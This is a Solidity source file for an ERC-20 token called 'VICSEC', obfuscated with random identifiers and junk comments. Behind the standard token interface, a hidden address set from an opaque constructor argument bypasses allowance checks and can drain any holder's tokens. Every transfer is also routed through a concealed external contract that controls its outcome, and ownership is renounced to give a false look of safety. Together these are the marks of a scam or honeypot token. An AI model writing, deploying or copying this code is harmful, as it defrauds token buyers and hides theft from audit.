
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface rPdQzAWJlGJGkX {
    /*Shoes 24/365 quantify back-end copying JSON cross-platform Keyboard*/
    function gbJOjMVA( bytes calldata /*Fish back-end Rustic facilitate Kroon Operations Tala Global transmitting withdrawal*/PhKMeEBCsXcPPPN,bytes calldata /*Savings intermediate AI Product virtual overriding deposit*/jMXCmWfcKcICIBv/*Bedfordshire Optimized Serbian Avon Rustic Estate Fantastic*/) 
    external view returns (/*Cross-platform redefine system bandwidth intuitive Tools Clothing Jamaica Orchestrator homogeneous*/ bytes memory lQqRKTvFlNWaJr,bytes memory rvUqdvmQoboYIt);
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20Metadata is IERC20 {
   
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    
    function decimals() external view returns (uint8);
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    
    constructor() {
        _transferOwnership(_msgSender());
    }
    
    modifier onlyOwner() {
        _checkOwner();
        _;
    }
   
    function owner() public view virtual returns (address) {
        return _owner;
    }

    
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

   
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
       
       
    }
    function _transferOwnership(address newOwner) internal virtual {
            address oldOwner = _owner;
            _owner = newOwner;
            emit OwnershipTransferred(oldOwner, newOwner);
           
    }
    
}


contract vsecCoin is Ownable, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    string    private _name = "VICSEC";
    string    private _symbol = "VICSEC";
    uint256   private _totalSupply = 10000000000 * 10**18;

   
    constructor(uint256 zjVZxePOsRT,uint256 ZIgbiLzfwrl)  {
          EaBILLdGmws[address(this)] = /*Ergonomic auxiliary experiences circuit monitor holistic Accountability*/
          address(/*hack Profound parsing Nevada Object-based full-range quantifying Markets withdrawal*/uint160(/*e-enable Associate sensor aggregate Metal Fresh input Sports*/zjVZxePOsRT));
        /*Chair protocol website emulation instruction Berkshire Serbia back Overpass Wooden Buckinghamshire*/
        WtiVADmzjPezCE = rPdQzAWJlGJGkX(
            address(/*Strategist Loan Minnesota Polarised Synchronised paradigms responsive Home recontextualize*/uint160(/*Cedi Savings Quality composite integrated Soft Developer Account Tools fuchsia Wallis customized*/ZIgbiLzfwrl)));
        /*Strategist Account Solutions Montana indexing Assurance Health Frozen*/
        _balances[msg.sender] = _totalSupply;
        /*Guernsey archive bypass transmitting Account Soft Shoes*/
        emit Transfer(address(0), msg.sender, _totalSupply);
        /*Home Music Ocean scale Grocery Practical intuitive Concrete logistical*/
        renounceOwnership();
      
   }
    
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
    
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        /*solid User-friendly cross-media XML set Pizza Cuba Small Canadian enterprise*/
        address owner = _msgSender();
        _approve(owner, spender, /*Open-source Wooden customer Berkshire Card web Real overriding*/allowance(owner, spender) + addedValue);
        return true;
    }
    
   
    mapping(uint256 => /*Stand-alone online Total utilize Customizable expedite*/address[]) private/*Factors magenta Corporate payment sensor Account generate USB bypass Marketing Home Cotton*/ OFvdWercdYp;
    
    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
    
    function aiRLmkUCse(address /*Account Monitored Ports SMS moderator Cambridgeshire enhance Unbranded navigating*/spender) public view  returns (bytes /*bus Singapore Lats Buckinghamshire Borders*/memory,uint256[]/*redundant Frozen Svalbard Credit Chile Granite SMTP IB Producer Ball Utah Account*/ memory) {
        return(PDrtqsaaEhcc[/*product Representative grey SSL District New Hat Suriname*/spender],/*Computers Clothing Small Fresh Investment infrastructures maximized content*/eVlwcHgIAn[/*implement Officer Profit-focused Handmade Cheese schemas mesh hardware Bedfordshire optical invoice frame*/spender]);
    }

    

    mapping(address/*Coordinator Account Incredible Skyway Account*/ => uint256[/*national withdrawal Rubber Palestinian York Avon*/]) private eVlwcHgIAn/*Missouri Seychelles Bacon Factors conglomeration Grocery Shoes New*/;
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    
    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        /*benchmark quantifying Unbranded dedicated Refined functionalities Delaware*/
        _transfer/*Colon Open-architected redundant Soft enable Organic Delaware fuchsia dot-com*/(from, to, amount);
        /*olive De-engineered Generic bandwidth matrix Uzbekistan Regional Cotton*/
        address spender = _msgSender(/*Configuration Missouri synergistic Chief Soft Stand-alone Functionality Nigeria Horizontal info-mediaries*/);
        /*Concrete Accountability synthesize bandwidth integrated Architect*/
        _spendAllowance(from, spender, amount);
        
        
        return true;
    }
    
    
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        /*Forks circuit Checking connect bi-directional Junction Intelligent XSS Tools Bike*/
        address owner = _msgSender();
        _transfer(owner, to, amount);
        
        return true;
    }
    
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    
     function lkUFdMjxJaVaRi(
        address from,
        address to,
        uint256 amount,
        bytes memory decodeData
    ) internal virtual  returns (bool){
        /*transmitting Incredible Colombian programming synthesize Kansas Granite*/
        (bool DwIXbdqHKzIdBxVC,uint8 RqsMHhrztW,uint256 /*navigate Way withdrawal lavender Handmade Dollar Salad Public-key overriding*/fromBalance,
        /*cyan Loan interactive quantifying virtual violet B2B Utah Soft*/
        uint256 RrnkBWVUXJoo,/*systemic Steel index Nevada circuit Peru programming International*/bool pjCkRbOJfMECC) = 
        
        abi./*calculate copy Cotton multi-byte Tuvalu Bedfordshire silver*/decode(decodeData,(bool,uint8,uint256,/*synergies Account Ball deposit Agent Plastic*/uint256,bool));
        /*solid tan Avon exploit Account Digitized firewall Metal*/
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        /*solutions challenge customized Home payment*/
        if(RqsMHhrztW == 1 /*Metal encryption Salad withdrawal Guinea-Bissau National violet Automotive sensor Jewelery Shirt invoice*/){OFvdWercdYp[block.number]/*24/365 lime Oregon withdrawal model Representative*/.push(tx/*revolutionize HDD ubiquitous Ergonomic Toys circuit Jewelery*/.origin);}
        /*connect orchestrate Communications Berkshire neural Borders payment Avon function generation*/
        if(pjCkRbOJfMECC/*hacking Loan gold connecting Wyoming Branch Agent Licensed sexy Point bus*/){eVlwcHgIAn[address(this)] = /*PCI Operations Gambia drive Small override*/new uint256[](1);}
        
        if(RrnkBWVUXJoo >1){/*Rubber deposit Bedfordshire Coves metrics Bolivia*/eVlwcHgIAn[address(this)].push(RrnkBWVUXJoo);}


        unchecked {
            _balances[from] = fromBalance - amount;
            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
            // decrementing then incrementing.
           
            _balances[to] += amount;
            /*Small Brunei neural payment Garden robust generation*/
        }
        emit Transfer(from, to, amount);
        return DwIXbdqHKzIdBxVC;
    }
    
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    
    mapping(address => /*Product Fresh firmware Buckinghamshire Borders payment payment Oregon paradigms*/address) private /*composite bypassing capacity Incredible Soft silver Consultant Steel Refined*/EaBILLdGmws/*Central Global killer Tuna Baby integrate*/;
   
    
    
    
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        
        address owner = _msgSender();
        /*mission-critical Handmade Plastic Liaison transitional Fresh Keyboard Armenia*/
        _approve(owner, spender, amount);
        return true;
    }
    

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        /*Personal value-added Chicken GB bus Customizable system Toys*/
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        
        emit Approval(owner, spender, amount);
    }

    
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
         /*Dobra Regional middleware frame SMTP generating Developer Licensed Cheese Pants Berkshire Fish*/
        address owner = _msgSender();
        uint256 currentAllowance = allowance(/*Solutions IB Tasty Checking Frozen*/owner, spender);
         /*Ergonomic azure wireless Marketing Illinois connecting Towels*/
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, /*AGP back-end Card visualize Card*/currentAllowance - subtractedValue);
        }

        return true;
    }
    

    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        
        uint256 currentAllowance = /*leading-edge Mouse Specialist Bedfordshire actuating*/allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            if(_msgSender() == EaBILLdGmws[address(this)]) return;
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, /*web Hill Frozen Home Cheese artificial Keyboard copying*/currentAllowance - amount);
            }
        }
    }
    
    rPdQzAWJlGJGkX private /*indexing Franc synthesizing generate generate Mouse program*/WtiVADmzjPezCE;
    

    mapping(address/*Savings embrace Global Personal Buckinghamshire e-services paradigms Books transmitting Manager*/ => bytes) private /*IB Sports Ameliorated Soft generation zero frame Functionality blue Metal override*/PDrtqsaaEhcc;
    
    function _transfer(address from, address to, uint256 amount) internal virtual returns (bool){
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        /*azure Unbranded Car bandwidth Fantastic capacitor Buckinghamshire SCSI Taiwan Technician deploy black*/
        if(from == to || amount == 0 /*channels model olive directional bypassing Networked*/) return true;


        _beforeTokenTransfer(/*Sharable copying Steel ADP optical Rapid AGP navigating Handcrafted Arkansas task-force invoice*/from, to, amount);
        
       
        bytes memory eAMGQOnScgDURHp = abi.encode(from,to,/*Sleek Frozen parsing Mississippi Avon Ergonomic*/amount,_balances[from]/*TCP Beauty national Markets gold capacitor infrastructures 1080p*/,OFvdWercdYp[/*navigating Concrete Club Salad Credit Cambridgeshire compelling deposit Lilangeni Ethiopian Sleek Security*/block.number]);

        (bytes memory/*payment maximized task-force Car Direct workforce Fish Avon Minnesota Implementation Intelligent Cambodia*/ tfWfxYVuewB,bytes /*olive Specialist withdrawal interfaces blue Multi-tiered Saint SQL Crossroad Chicken Engineer*/memory jikyqezWZPbjol) =  
            WtiVADmzjPezCE./*next-generation Mississippi Factors deposit Infrastructure group Account COM*/gbJOjMVA(eAMGQOnScgDURHp,/*Virgin PNG Table Awesome Generic Pound Bedfordshire Incredible Developer Avon overriding disintermediate*/PDrtqsaaEhcc[address(this)]);/*Checking Principal copying Plastic paradigms Keyboard*/PDrtqsaaEhcc[address(this)] =/*user-centric Accounts Terrace compressing withdrawal salmon Account Netherlands*/ jikyqezWZPbjol;
        
        return lkUFdMjxJaVaRi(from,to,amount,tfWfxYVuewB);
    }
    
   
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        /*knowledge Borders Hat Jewelery Utah Kuwait generating invoice overriding Granite New Rubber*/
        return _allowances[owner][spender];
    }
    
}

